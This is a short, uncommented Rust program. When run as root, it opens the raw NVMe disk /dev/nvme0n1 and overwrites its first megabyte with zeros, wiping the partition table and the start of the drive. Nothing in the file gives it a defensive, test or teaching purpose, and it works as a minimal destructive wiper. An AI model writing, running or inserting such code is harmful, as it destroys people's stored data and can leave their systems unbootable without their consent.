use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::fs::OpenOptionsExt;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let mut f = OpenOptions::new().write(true).custom_flags(libc::O_RDWR)
        .open("/dev/nvme0n1").unwrap();
    let _ = f.write_all(&[0u8; 1048576]);
}
